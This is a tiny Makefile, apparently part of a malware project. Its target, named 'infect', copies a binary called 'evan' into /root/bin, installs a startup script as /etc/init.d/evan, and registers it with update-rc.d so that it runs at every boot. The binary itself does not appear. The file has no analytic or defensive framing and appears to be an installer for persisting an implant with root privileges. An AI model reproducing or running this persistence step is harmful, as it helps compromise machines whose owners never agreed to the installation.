.PHONY: infect
INSTALL_DIR = /root/bin
infect:
	mkdir -p ${INSTALL_DIR}
	cp evan ${INSTALL_DIR}
	cp evan-startup /etc/init.d/evan
	update-rc.d evan start

